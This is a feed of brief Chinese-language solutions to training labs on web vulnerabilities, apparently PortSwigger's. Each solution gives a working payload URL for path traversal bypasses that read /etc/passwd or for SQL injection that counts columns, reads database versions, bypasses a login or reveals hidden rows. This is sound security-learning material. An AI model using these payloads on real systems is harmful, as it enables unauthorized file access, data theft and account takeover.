channel.title: Write-Up on Terminal
channel.description: Recent content in Write-Up on Terminal

item.title: [Write Up]Lab: File path traversal, validation of file extension with null byte bypass
item.content:
Lab description

Solution

  1. 请求内容同前题，且题目中也提到图片资源请求中包含路径遍历漏洞
  2. 但不同于前题，题目中提到The application validates that the supplied filename ends with the expected file extension.；使用null byte通过文件扩展名检查
  3. 最终url为/image?filename=../../../etc/passwd%00.jpg

item.title: [Write Up]Lab: File path traversal, validation of start of path
item.content:
Lab description

Solution

  1. 请求内容同前题，且题目中也提到图片资源请求中包含路径遍历漏洞
  2. 但不同于前题，题目中提到The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.，此题的图片资源请求路径为/image?filename=/var/www/images/xx.jpg，需要以/var/www/images为起始路径
  3. 最终url为/image?filename=/var/www/images/../../../etc/passwd

item.title: [Write Up]Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
item.content:
Lab description

Solution

  1. 请求内容同前题，且题目中也提到图片资源请求中包含路径遍历漏洞
  2. 但不同于前题，题目中提到The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
  3. url编码对应如下
    • .: %2e
    • /: %2f
    • %: %25
  4. 参考上述编码../../../etc/passwd的url编码为%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
  5. 最终url为/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

item.title: [Write Up]Lab: File path traversal, traversal sequences stripped non-recursively
item.content:
Lab description

Solution

  1. 请求内容同前题，且题目中也提到图片资源请求中包含路径遍历漏洞
  2. 但不同于前题，题目中提到The application strips path traversal sequences from the user-supplied filename before using it.
  3. 最终url为/image?filename=....//....//....//etc//passwd

item.title: [Write Up]Lab: File path traversal, traversal sequences blocked with absolute path bypass
item.content:
Lab description

Solution

  1. 请求内容同前题，且题目中也提到图片资源请求中包含路径遍历漏洞
  2. 但不同于前题，题目中提到The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.
  3. 最终url为/image?filename=/etc/passwd

item.title: [Write Up]Lab: File path traversal, simple case
item.content:
Lab description

Solution

  1. 使用Burp suite观察此Lab，会发现有许多图片资源请求
  2. 题目中明确提到图片资源请求中包含路径遍历漏洞，所以尝试在请求url的filename参数前段不断新增../便可达成目的；最终url为/image?filename=../../../etc/passwd

item.title: [Write Up]Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
item.content:
Lab description

Solution

  1. 推测SQL query为SELECT * FROM table WHERE category = <category>
  2. 此题需要通过UNION 注入攻击获取MySQL、Microsoft数据库的类型和版本
  3. UNION 注入攻击需要以下三步
    1. 判断列数
      1. 使用order by n语句不断累加n，n累加到3时报错，所以判断SQL query的返回列数为2
      2. url为/filter?category=Gifts' order by 2#
    2. 判断显示位
      1. url为/filter?category=Gifts' union select 'a1','a2'%23
        • %23为#的URL 编码，通过浏览器发送url时需要进行编码；通过Burp Suite时Burp Suite会自动进行编码
    3. 获取目标数据
      1. 根据SQL injection cheat sheet，MySQL、Microsoft数据库的类型和版本获取方式为SELECT @@version
      2. url为/filter?category=Gifts' union select @@version,null%23

item.title: [Write Up]Lab: SQL injection UNION attack, finding a column containing text
item.content:
Lab description

Solution

  1. 根据前题，SQL query为SELECT * FROM table WHERE category = ‘’，且返回字段数为3
  2. 此题需要将题目给出的随机字符串注入至SQL query所返回的字段内容中
  3. 解题的url为filter?category=Lifestyle' UNION (select null, '<随机字符串>', null)--
    • 例如随机字符串为VGs2z9，所以url为filter?category=Lifestyle' UNION (select null, 'VGs2z9', null)--

item.title: [Write Up]Lab: SQL injection UNION attack, determining the number of columns returned by the query
item.content:
Lab description

Solution

  1. 同前题，SQL query为SELECT * FROM table WHERE category = '<category>'
  2. 此题需要获取SQL query所返回的字段数量，有两种方法
    1. 使用UNION (select null, null...)--，不断新增null,，直到不返回报错(Internal Server Error)
    2. 使用ORDER BY n--，不断递减n，直到不返回报错(Internal Server Error)
  3. 使用方法1，解题的url为filter?category=Accessories'+UNION+(select+null,+null,+null)--

item.title: [Write Up]Lab: SQL injection attack, querying the database type and version on Oracle
item.content:
Lab description

Solution

  1. 推测SQL query为SELECT * FROM table WHERE category = <category>
  2. 此题需要通过UNION 注入攻击获取Oracle数据库的类型和版本
  3. UNION 注入攻击需要以下三步
    1. 判断列数
      1. 使用order by n语句不断累加n，n累加到3时报错，所以判断SQL query的返回列数为2
      2. url为filter?category=Accessories'+order+by+2--
    2. 判断显示位
      1. 根据题目Hit，Oracle数据库中的SELECT语句必须指定FROM，可以使用Oracle内置的DUAL表来达成目的
      2. url为filter?category=Accessories'+union+select+'a1',+'a2'+from+dual+--
    3. 获取目标数据
      1. 根据SQL injection cheat sheet，Oracle数据库的类型和版本获取方式为SELECT banner FROM v$version
      2. url为filter?category=Accessories'+union+select+banner,+null+from+v$version+--

item.title: [Write Up]Lab: SQL injection vulnerability allowing login bypass
item.content:
Lab description

Solution

  1. 点击My account后看到登录画面
  2. 根据题目此登录逻辑包含SQL注入问题，猜测后端的SQL query为SELECT * FROM users WHERE username = '<username>' AND password = '<password>'，如何将AND之后的查询条件隐去，为此题的目标
  3. 通过<username>将后面SQL query去除，尝试使用administrator'--作为参数传入，将后端的SQL qeruy变为SELECT * FROM users WHERE username = 'administrator'--' AND password = '<password>'

item.title: [Write Up]Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
item.content:
Lab description

Solution

  1. 点击Refine your search:时，观察url的变化，例如点击Corporate gifts时，url为/filter?category=Corporate+gifts
  2. 根据描述中的SQL query得知，category的参数值将透传给SQL category的比较值；但是SQL query中在后续还有查询条件AND released = 1，所以使用category的参数值影响SQL query，将后续的查询条件去除，为破题所在
  3. 尝试在url后面+or+1=1--进行查询，根据页面回显，发现SQL query没有闭合，所以SQL query没有受到影响
  4. 新增单引号'将SQL query闭合，完整url为filter?category=Corporate+gifts'+or+1=1--，发送请求后，即可看到全部的商品
